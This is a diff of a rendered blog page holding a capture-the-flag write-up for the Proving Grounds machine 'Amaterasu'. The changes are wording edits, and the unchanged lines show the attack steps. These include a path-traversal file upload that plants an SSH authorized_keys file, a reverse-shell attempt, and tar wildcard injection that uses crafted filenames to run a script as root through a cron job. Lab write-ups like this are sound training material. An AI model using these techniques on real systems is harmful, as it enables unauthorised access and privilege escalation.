@@ -56,7 +56,7 @@
         },
         "datePublished": "2024-01-01",
         "description": "Writeup for PG Amaterasu",
-        "wordCount":  1071 ,
+        "wordCount":  1069 ,
         "mainEntityOfPage": "True",
         "dateModified": "2024-01-01",
         "image": {
@@ -404,7 +404,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-resolved.service-pDGRUI&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">  <span class="s2">&#34;systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-oomd.service-dJ9LLo&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="p">]</span>
-</span></span></code></pre></div><p>Let’s try to upload some file here.</p>
+</span></span></code></pre></div><p>The API provides a file upload feature.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">💀</span><span class="n">kali</span><span class="p">)-[~/</span><span class="n">amaterasu2</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c"># curl -X POST http://192.168.162.249:33414/file-upload -F file=@./rev.php.txt -F filename=&#39;rev.php&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;message&#34;</span><span class="err">:</span><span class="s2">&#34;File successfully uploaded&#34;</span><span class="p">}</span>
@@ -433,7 +433,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">title</span><span class="p">&gt;</span><span class="mf">500</span> <span class="n">Internal</span> <span class="n">Server</span> <span class="n">Error</span><span class="p">&lt;/</span><span class="n">title</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">h1</span><span class="p">&gt;</span><span class="n">Internal</span> <span class="n">Server</span> <span class="n">Error</span><span class="p">&lt;/</span><span class="n">h1</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;</span><span class="n">The</span> <span class="n">server</span> <span class="n">encountered</span> <span class="n">an</span> <span class="n">internal</span> <span class="n">error</span> <span class="n">and</span> <span class="n">was</span> <span class="n">unable</span> <span class="n">to</span> <span class="n">complete</span> <span class="n">your</span> <span class="n">request</span><span class="p">.</span> <span class="n">Either</span> <span class="n">the</span> <span class="n">server</span> <span class="n">is</span> <span class="n">overloaded</span> <span class="n">or</span> <span class="n">there</span> <span class="n">is</span> <span class="n">an</span> <span class="n">error</span> <span class="k">in</span> <span class="n">the</span> <span class="n">application</span><span class="p">.&lt;/</span><span class="n">p</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>Upload and execute php reverse shell does not work.</p>
+</span></span></code></pre></div><p>Uploaded and executed php reverse shell, but it did not work.</p>
 <h1 id="first-shell">First Shell</h1>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">💀</span><span class="n">kali</span><span class="p">)-[~/</span><span class="n">amaterasu2</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c"># curl -X POST http://192.168.162.249:33414/file-upload -F file=@./id_rsa.pub.txt -F filename=&#39;../home/alfredo/.ssh/authorized_keys&#39;</span>
@@ -446,7 +446,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="n">Last</span> <span class="n">login</span><span class="err">:</span> <span class="n">Tue</span> <span class="n">Mar</span> <span class="mf">28</span> <span class="mf">03</span><span class="err">:</span><span class="mf">21</span><span class="err">:</span><span class="mf">25</span> <span class="mf">2023</span>
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">alfredo</span><span class="nv">@fedora</span> <span class="p">~]$</span> <span class="n">whoami</span>
 </span></span><span class="line"><span class="cl"><span class="n">alfredo</span>
-</span></span></code></pre></div><p>Generated ssh key and upload it as authorized_keys in some home user folder and got ssh connection.</p>
+</span></span></code></pre></div><p>Generated ssh key and uploaded it as authorized_keys in some home user folder and got ssh connection.</p>
 <h1 id="privilege-escalation">Privilege Escalation</h1>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*/</span><span class="mf">1</span> <span class="p">*</span> <span class="p">*</span> <span class="p">*</span> <span class="p">*</span> <span class="n">root</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">local</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="nb">backup-flask</span><span class="p">.</span><span class="py">sh</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">alfredo</span><span class="nv">@fedora</span> <span class="n">restapi</span><span class="p">]$</span> <span class="nb">cat </span><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">local</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="nb">backup-flask</span><span class="p">.</span><span class="py">sh</span> 
@@ -455,7 +455,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="nb">cd </span><span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">alfredo</span><span class="p">/</span><span class="n">restapi</span>
 </span></span><span class="line"><span class="cl"><span class="n">tar</span> <span class="n">czf</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">flask</span><span class="p">.</span><span class="py">tar</span><span class="p">.</span><span class="py">gz</span> <span class="p">*</span>
 </span></span></code></pre></div><p>After running linPEAS.sh, I found cron job running every minute, execute some script as root user.</p>
-<p>This tar command with wild card at the end can be exploited.</p>
+<p>This tar command with wild card can be exploited.</p>
 <p><a href="https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c">Privilege Escalation Using Wildcard Injection | Tar Wildcard Injection |</a></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">alfredo</span><span class="nv">@fedora</span> <span class="n">restapi</span><span class="p">]$</span> <span class="nb">cat </span><span class="n">rev</span><span class="p">.</span><span class="py">sh</span>
 </span></span><span class="line"><span class="cl"><span class="c">#!/bin/bash</span>
@@ -464,10 +464,10 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span></code></pre></div><p>Put reverse shell script in the <code>restapi</code> directory</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">alfredo</span><span class="nv">@fedora</span> <span class="n">restapi</span><span class="p">]$</span> <span class="nb">echo </span><span class="s2">&#34;&#34;</span> <span class="p">&gt;</span> <span class="s1">&#39;--checkpoint-action=exec=sh rev.sh&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">alfredo</span><span class="nv">@fedora</span> <span class="n">restapi</span><span class="p">]$</span> <span class="nb">echo </span><span class="s2">&#34;&#34;</span> <span class="p">&gt;</span> <span class="s2">&#34;--checkpoint=1&#34;</span>
-</span></span></code></pre></div><p>And run the commands above. These commands are registered as <code>tar czf /tmp/flask.tar.gz --checkpoint-action=exec=sh rev.sh --checkpoint=1</code> when cronjob is executed.</p>
+</span></span></code></pre></div><p>Ran the commands above. These commands are registered as <code>tar czf /tmp/flask.tar.gz --checkpoint-action=exec=sh rev.sh --checkpoint=1</code> when cronjob is executed.</p>
 <h1 id="root-shell">Root shell</h1>
 <p><img src="Amaterasu%208a737b17570c4996b62a570a406df97f/Screenshot_2024-01-01_at_21.01.02.png" alt="Screenshot 2024-01-01 at 21.01.02.png"></p>
-<p>Wait for 1 minute, and got root shell.</p>
+<p>Waited for 1 minute, and got root shell.</p>
 
             </div>
         </article></main>
